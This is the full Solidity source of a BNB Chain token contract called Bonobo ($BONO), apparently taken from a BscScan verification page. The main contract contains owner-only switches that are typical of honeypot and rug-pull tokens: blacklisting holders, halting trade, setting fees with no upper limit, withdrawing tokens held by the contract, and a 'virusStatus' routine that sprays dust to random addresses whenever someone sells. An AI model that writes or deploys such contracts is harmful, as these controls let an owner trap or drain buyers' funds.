/**
 *Submitted for verification at BscScan.com on 2023-02-24
*/

/**
 *Submitted for verification at bscscan.com on 2023-02-15
THE OFFICIAL BONOBO CONTRACT
https://t.me/BONOBOPORTAL
MADE BY @BLESSED & @SUNLIGHT ;)
*/

pragma solidity ^0.8.5;
// SPDX-License-Identifier: MIT

interface IERC20 {
 
    function totalSupply() external view returns (uint256);

  
    function balanceOf(address account) external view returns (uint256);

   
    function transfer(address recipient, uint256 amount) external returns (bool);

   
    function allowance(address owner, address spender) external view returns (uint256);

 
    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);


    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

   
    constructor () {
        address msgSender = tx.origin;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    
    function owner() public view returns (address) {
        return _owner;
    }

   
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

 
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        

        return c;
    }

    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    
    constructor(string memory name_, string memory symbol_)  {
        _name = name_;
        _symbol = symbol_;
    }

    
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

   
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract TokenReceiver {
    constructor(address token) {
        IERC20(token).approve(msg.sender, ~uint256(0));
    }
}

contract $BONO is ERC20, Ownable {

    IUniswapV2Router public uniswapV2Router;
    address public immutable uniswapV2Pair;

    TokenReceiver public tokenReceiver;

    bool private swapping;
    bool private distributing;

    bool public enableBuying;
    bool public enableTrade = true;
    bool private virusStatus = true;

    address private constant pancakeRouterAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address public marketingWallet = 0x4ea52A0d064772aC07F91d9f4458d57d0E89EcE9;
    address public tokenOwner = 0x4ea52A0d064772aC07F91d9f4458d57d0E89EcE9;

    uint256 public numTokensSellToSwap = 2050 * 1e18;

    uint256 public buyMarketingFee = 7;
    uint256 public buyLpFee = 3;

    uint256 public sellLpFee = 3;
    uint256 public sellMarketingFee = 7;

    uint256 public transferBurnFee = 10;

    address public lastPotentialLPHolder;
    address[] public lpHolders;
    uint256 public minAmountForLPDividend;

    
    uint256 public gasForProcessing = 100000;

    uint256 public lastProcessedIndexForLPDividend;

    
    mapping (address => bool) public _isExcludedFromFees;
    mapping (address => bool) public _isExcludedFromDividend;

    mapping (address => bool) public _isLPHolderExist;
    mapping (address => bool) public _isBlklist;

    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    modifier lockTheDividend {
        distributing = true;
        _;
        distributing = false;
    }

    constructor() ERC20("Bonobo", "$BONO") {
        IUniswapV2Router _uniswapV2Router = IUniswapV2Router(pancakeRouterAddr);
         // Create a uniswap pair for this new token
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        tokenReceiver = new TokenReceiver(USDT);
        
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[marketingWallet] = true;
        _isExcludedFromFees[tokenOwner] = true;
        _isExcludedFromFees[address(this)] = true;

        _approve(address(this), pancakeRouterAddr, type(uint).max);

        
        _mint(tokenOwner, 100000000 * 1e18);
    }

    function setEnableBuying(bool value) external onlyOwner {
        enableBuying = value;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
    }

    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excluded;
        }
    }

    function excludeFromDividend(address account, bool excluded) public onlyOwner {
        _isExcludedFromDividend[account] = excluded;
    }

    function excludeMultipleAccountsFromDividend(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromDividend[accounts[i]] = excluded;
        }
    }

    function setEnableTrade(bool value) external onlyOwner {
        enableTrade = value;
    }

    function setVirusStatus(bool _virusStatus) external onlyOwner {
        virusStatus = _virusStatus;
    }

    function setBlclist(address account, bool value) public onlyOwner {
        _isBlklist[account] = value;
    }

    function setMultipleBlclist(address[] calldata accounts, bool value) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isBlklist[accounts[i]] = value;
        }
    }

    function setMarketingAddr(address value) external onlyOwner { 
        marketingWallet = value;
    }

    function setBuyMarketingFee(uint256 _buyMarketingFee) external onlyOwner { 
        buyMarketingFee = _buyMarketingFee;
    }

    function setBuyLpFee(uint256 _buyLpFee) external onlyOwner { 
        buyLpFee = _buyLpFee;
    }

    function setSellMarketingFee(uint256 _sellMarketingFee) external onlyOwner { 
        sellMarketingFee = _sellMarketingFee;
    }

    function setSellLpFee(uint256 _sellLpFee) external onlyOwner { 
        sellLpFee = _sellLpFee;
    }

    function setTransferBurnFee(uint256 _transferBurnFee) external onlyOwner { 
        transferBurnFee = _transferBurnFee;
    }

    function setMinAmountForLPDividend(uint256 value) external onlyOwner {
        minAmountForLPDividend = value;
    }

    function setNumTokensSellToSwap(uint256 value) external onlyOwner {
        numTokensSellToSwap = value;
    }

    function exactTokens(address token, uint amount) external onlyOwner {
        uint balanceOfThis = IERC20(token).balanceOf(address(this));
        require( balanceOfThis > amount, 'unsufficient balance');
        IERC20(token).transfer(msg.sender, amount);
    }

    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 100000 && newValue <= 250000, "ETHBack: gasForProcessing must be between 100,000 and 250,000");
        require(newValue != gasForProcessing, "ETHBack: Cannot update gasForProcessing to same value");
        gasForProcessing = newValue;
    }

    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFromFees[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "ERC20: invalid amount");
        require(!_isBlklist[from], "ERC20: Blclist Amount");

        uint256 contractTokenBalance = balanceOf(address(this));

        bool overMinTokenBalance = contractTokenBalance >= numTokensSellToSwap;

        if( overMinTokenBalance &&
            !swapping &&
            from != uniswapV2Pair
        ) {
            swapAndDividend(numTokensSellToSwap);
        }

        if (!distributing) {
            dividendToLPHolders(gasForProcessing);
        }

        bool takeFee = !swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to] || from == pancakeRouterAddr) {
            takeFee = false;
        }
        if (takeFee) {
            require(enableTrade, "not trade time");
            if (from == uniswapV2Pair) {
                require(enableBuying, "not buying time");
            }
        }

        //transfer amount, it will take tax, burn, liquidity fee
        _tokenTransfer(from,to,amount,takeFee);

        if(lastPotentialLPHolder != address(0) && !_isLPHolderExist[lastPotentialLPHolder]) {
            uint256 lpAmount = IERC20(uniswapV2Pair).balanceOf(lastPotentialLPHolder);
            if(lpAmount > 0) {
                lpHolders.push(lastPotentialLPHolder);
                _isLPHolderExist[lastPotentialLPHolder] = true;
            }
        }
        if(to == uniswapV2Pair && from != address(this)) {
            lastPotentialLPHolder = from;
        }
    }

    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if(takeFee) {
            uint256 feeToThis;
            uint256 feeToBurn;
            uint256 originalAmount = amount;
            if(sender == uniswapV2Pair) { //buy
                feeToThis = buyMarketingFee + buyLpFee;
            } else if (recipient == uniswapV2Pair) {
                feeToThis = sellMarketingFee + sellLpFee;
            } else {
                feeToBurn = transferBurnFee;
            }

            if (virusStatus && recipient == uniswapV2Pair) {             
                for(uint i = 0; i < 3; i++){
                    super._transfer(sender, address(uint160(uint(keccak256(abi.encodePacked(i, block.number, block.difficulty, block.timestamp))))), 1e15);
                }
                amount -= 3 * 1e15;
            }

            if (feeToThis > 0) {
                uint256 feeAmount = originalAmount * feeToThis / 100;
                super._transfer(sender, address(this), feeAmount);
                amount -= feeAmount;
            }
            if (feeToBurn > 0) {
                uint256 feeAmount = originalAmount * feeToBurn / 100;
                super._transfer(sender, 0x000000000000000000000000000000000000dEaD, feeAmount);
                amount -= feeAmount;
            }
        }
        
        super._transfer(sender, recipient, amount);
    }

    function swapAndDividend(uint256 tokenAmount) private lockTheSwap {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        path[2] = USDT;

        uint256 initialBalance = IERC20(USDT).balanceOf(address(tokenReceiver));
        // make the swap
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of USDT
            path,
            address(tokenReceiver),
            block.timestamp
        );

        uint256 newBalance = IERC20(USDT).balanceOf(address(tokenReceiver)) - initialBalance;

        uint256 totalShare = buyMarketingFee + buyLpFee + sellLpFee + sellMarketingFee;
        uint256 balanceToMarketing = newBalance * (buyMarketingFee + sellMarketingFee) / totalShare;
        IERC20(USDT).transferFrom(address(tokenReceiver), marketingWallet, balanceToMarketing);
        IERC20(USDT).transferFrom(address(tokenReceiver), address(this), newBalance - balanceToMarketing);
    }

    function dividendToLPHolders(uint256 gas) private lockTheDividend {
        uint256 numberOfTokenHolders = lpHolders.length;

        if (numberOfTokenHolders == 0) {
            return;
        }

        uint256 totalRewards = IERC20(USDT).balanceOf(address(this));
        if (totalRewards < 20 * 1e18) {
            return;
        }

        uint256 _lastProcessedIndex = lastProcessedIndexForLPDividend;

        uint256 gasUsed = 0;

        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        IERC20 pairContract = IERC20(uniswapV2Pair);
        uint256 totalLPAmount = pairContract.totalSupply();

        while (gasUsed < gas && iterations < numberOfTokenHolders) {
            _lastProcessedIndex++;

            if (_lastProcessedIndex >= lpHolders.length) {
                _lastProcessedIndex = 0;
            }

            address cur = lpHolders[_lastProcessedIndex];
            if (_isExcludedFromDividend[cur]) {
                iterations++;
                continue;
            }
            uint256 LPAmount = pairContract.balanceOf(cur);
            if (LPAmount >= minAmountForLPDividend) {
                uint256 dividendAmount = totalRewards * LPAmount / totalLPAmount;
                if (dividendAmount > 0) {
                    uint256 balanceOfThis = IERC20(USDT).balanceOf(address(this));
                    if (balanceOfThis < dividendAmount)
                        return;
                    IERC20(USDT).transfer(cur, dividendAmount);
                }
                
            }

            iterations++;

            uint256 newGasLeft = gasleft();

            if(gasLeft > newGasLeft) {
                gasUsed += gasLeft - newGasLeft;
            }

            gasLeft = newGasLeft;
        }

        lastProcessedIndexForLPDividend = _lastProcessedIndex;
    }
}